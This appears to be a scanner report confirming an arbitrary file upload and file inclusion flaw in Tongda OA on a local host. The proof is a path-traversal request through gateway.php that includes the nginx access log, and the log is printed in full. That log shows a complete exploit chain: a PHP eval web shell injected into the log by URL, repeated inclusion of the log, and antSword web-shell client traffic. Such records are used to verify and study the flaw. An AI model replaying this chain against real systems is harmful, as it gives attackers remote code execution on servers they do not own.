127.0.0.1存在通达OA任意文件上传和文件包含漏洞
验证数据:
读取文件位置:http://127.0.0.1:80/ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log
文件返回内容:127.0.0.1 - - [18/Mar/2020:21:13:10 +0800] "GET / HTTP/1.1" 200 10128 "-" "-" "-"
127.0.0.1 - - [18/Mar/2020:21:13:10 +0800] "GET / HTTP/1.1" 200 7988 "-" "-" "-"
127.0.0.1 - - [18/Mar/2020:21:13:15 +0800] "GET / HTTP/1.1" 200 3132 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:13:15 +0800] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:23:00 +0800] "POST /ispirit/im/upload.php HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:23:00 +0800] "POST /ispirit/interface/gateway.php HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:23:00 +0800] "GET /ispirit/interface/readme.php HTTP/1.1" 404 56 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:23:19 +0800] "POST /ispirit/im/upload.php HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:23:19 +0800] "POST /ispirit/interface/gateway.php HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:23:19 +0800] "GET /ispirit/interface/readme.php HTTP/1.1" 404 56 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:24:25 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 352 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:25:04 +0800] "GET /ispirit/interface/gateway.php?%3C?php%20@eval($_POST[pass]);?%3E HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:26:43 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 458 "-" "antSword/v2.0" "-"
127.0.0.1 - - [18/Mar/2020:21:26:48 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 499 "-" "antSword/v2.0" "-"
127.0.0.1 - - [18/Mar/2020:21:27:07 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 512 "-" "antSword/v2.0" "-"
127.0.0.1 - - [18/Mar/2020:21:27:09 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 522 "-" "antSword/v2.0" "-"
127.0.0.1 - - [18/Mar/2020:21:27:14 +0800] "GET /ispirit/interface/gateway.php?%3C?php%20@eval($_POST[pass]);?%3E HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:27:53 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 536 "-" "antSword/v2.0" "-"
127.0.0.1 - - [18/Mar/2020:21:28:01 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:28:33 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 564 "-" "antSword/v2.0" "-"
127.0.0.1 - - [18/Mar/2020:21:28:42 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 574 "-" "antSword/v2.0" "-"
192.168.1.3 - - [18/Mar/2020:21:29:44 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 580 "-" "antSword/v2.0" "-"
192.168.1.3 - - [18/Mar/2020:21:29:51 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 605 "-" "antSword/v2.0" "-"
127.0.0.1 - - [18/Mar/2020:21:32:14 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:32:26 +0800] "GET /ispirit/interface/gateway.php?%3C?php%20@eval($_POST[pass]);?%3E HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:32:32 +0800] "GET /ispirit/interface/gateway.php?%3C?php%20@eval($_POST[pass]);?%3E HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:32:40 +0800] "GET /ispirit/interface/gateway.php?%3C?php%20@eval($_POST[pass]);?%3E HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
192.168.1.3 - - [18/Mar/2020:21:32:54 +0800] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
192.168.1.3 - - [18/Mar/2020:21:32:54 +0800] "GET /ispirit/interface/gateway.php?%3C?php%20@eval($_POST[pass]);?%3E HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
192.168.1.3 - - [18/Mar/2020:21:33:04 +0800] "GET /ispirit/interface/gateway.php?%3C?php%20@eval($_POST[pass]);?%3E HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
192.168.1.3 - - [18/Mar/2020:21:33:19 +0800] "GET /ispirit/interface/gateway.php? HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
192.168.1.3 - - [18/Mar/2020:21:33:26 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 693 "-" "antSword/v2.0" "-"
127.0.0.1 - - [18/Mar/2020:21:33:37 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
192.168.1.3 - - [18/Mar/2020:21:34:02 +0800] "GET /ispirit/interface/gateway.php? HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
192.168.1.3 - - [18/Mar/2020:21:34:10 +0800] "GET /ispirit/interface/gateway.php?  HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
192.168.1.3 - - [18/Mar/2020:21:34:13 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 743 "-" "antSword/v2.0" "-"
192.168.1.3 - - [18/Mar/2020:21:34:50 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 752 "-" "antSword/v2.0" "-"
192.168.1.3 - - [18/Mar/2020:21:34:50 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 768 "-" "antSword/v2.0" "-"
192.168.1.3 - - [18/Mar/2020:21:34:55 +0800] "POST /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 774 "-" "antSword/v2.0"
127.0.0.1 - - [18/Mar/2020:21:36:07 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:36:08 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:36:09 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:36:09 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:36:09 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:36:10 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:36:10 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 500 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
192.168.1.3 - - [18/Mar/2020:21:37:11 +0800] "POST /ispirit/interface/readme.php HTTP/1.1" 404 56 "-" "antSword/v2.0" "-"
127.0.0.1 - - [18/Mar/2020:21:37:20 +0800] "GET /ispirit/interface/readme.php HTTP/1.1" 404 56 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:37:31 +0800] "GET /ispirit/interface/readme.php%EF%BC%9F HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:37:35 +0800] "GET /ispirit/interface/readme.php? HTTP/1.1" 404 56 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:37:39 +0800] "GET /ispirit/interface/readme.php?w HTTP/1.1" 404 56 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
192.168.1.3 - - [18/Mar/2020:21:38:53 +0800] "POST /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 500 5 "http://192.168.1.3" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "216.8.9.103"
127.0.0.1 - - [18/Mar/2020:21:40:09 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
192.168.1.3 - - [18/Mar/2020:21:40:13 +0800] "POST /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 6623 "http://192.168.1.3" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "216.8.9.103"
192.168.1.3 - - [18/Mar/2020:21:40:13 +0800] "POST /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 6825 "http://192.168.1.3" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "216.8.9.103"
192.168.1.3 - - [18/Mar/2020:21:49:06 +0800] "GET /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log  HTTP/1.1" 200 1033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:53:56 +0800] "GET /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 1053 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:53:56 +0800] "GET /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 1073 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:54:39 +0800] "GET /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 1084 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:54:39 +0800] "GET /ispirit/interface/gateway.php?json=%7B%7D&url=../../ispirit/../../nginx/logs/oa.access.log HTTP/1.1" 200 1099 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36" "-"
127.0.0.1 - - [18/Mar/2020:21:55:57 +0800] "GET /ispirit/interface/gateway.php?MedusaTextPocSAxGBW4wBIJe7gH0wsheMedusaScanTestPoc HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36" "-"


